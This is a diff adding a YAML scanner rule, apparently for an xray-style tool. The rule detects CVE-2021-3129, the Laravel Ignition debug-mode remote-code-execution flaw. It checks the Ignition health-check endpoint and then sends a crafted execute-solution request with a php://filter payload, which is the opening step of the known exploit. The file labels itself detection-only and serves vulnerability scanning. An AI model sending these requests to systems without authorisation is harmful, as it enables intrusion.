@@ -1,0 +1,22 @@
+name: poc-laravel-debug
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/_ignition/health-check"
+    expression: response.status == 200 || response.body.bcontains("ignition")
+  r1:
+    request:
+      method: POST
+      path: "/_ignition/execute-solution"
+      headers:
+        Content-Type: "application/json"
+      body: '{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"x","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be/resource=data:text/plain;base64,Pg=="}}'
+    expression: response.status == 500 || response.body.bcontains("ignition") || response.body.bcontains("file_get_contents")
+expression: r0() || r1()
+detail:
+  author: sxel
+  description: Laravel Ignition debug RCE probe (CVE-2021-3129, detection-only)
+  severity: critical
+  tags: laravel,php,rce
